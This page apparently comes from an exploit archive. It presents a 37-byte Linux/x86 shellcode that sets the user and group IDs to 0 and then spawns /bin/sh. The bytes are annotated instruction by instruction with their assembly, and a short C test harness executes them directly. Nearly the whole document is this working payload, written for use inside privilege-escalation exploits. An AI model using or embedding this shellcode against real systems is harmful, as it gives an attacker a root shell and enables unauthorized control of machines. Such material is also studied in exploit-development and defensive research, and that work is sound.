<html><head><title>Linux/x86 - setuid(0) + setgid(0) + execve(\\\&quot;/bin/sh\\\&quot;, [\\\&quot;/bin/sh\\\&quot;, NULL]) - 37 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (Linux/x86) setuid(0) + setgid(0) + execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;, NULL]) 
 * - 37 bytes
 * - xgc@gotfault.net
 *
 */

char shellcode[] =

  &quot;\x6a\x17&quot;			// push	$0x17
  &quot;\x58&quot;			// pop 	%eax
  &quot;\x31\xdb&quot;			// xor	%ebx, %ebx
  &quot;\xcd\x80&quot;			// int	$0x80

  &quot;\x6a\x2e&quot;			// push	$0x2e	
  &quot;\x58&quot;			// pop	%eax
  &quot;\x53&quot;			// push %ebx
  &quot;\xcd\x80&quot;			// int	$0x80

  &quot;\x31\xd2&quot;			// xor	%edx, %edx
  &quot;\x6a\x0b&quot;			// push	$0xb
  &quot;\x58&quot;			// pop	%eax
  &quot;\x52&quot;			// push	%edx
  &quot;\x68\x2f\x2f\x73\x68&quot;	// push	$0x68732f2f
  &quot;\x68\x2f\x62\x69\x6e&quot;	// push	$0x6e69622f
  &quot;\x89\xe3&quot;			// mov	%esp, %ebx
  &quot;\x52&quot;			// push	%edx
  &quot;\x53&quot;			// push	%ebx
  &quot;\x89\xe1&quot;			// mov	%esp, %ecx
  &quot;\xcd\x80&quot;;			// int	$0x80
 
int main() {
 
	int (*f)() = (int(*)())shellcode;
    printf(&quot;Length: %u\n&quot;, strlen(shellcode));
    f();
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
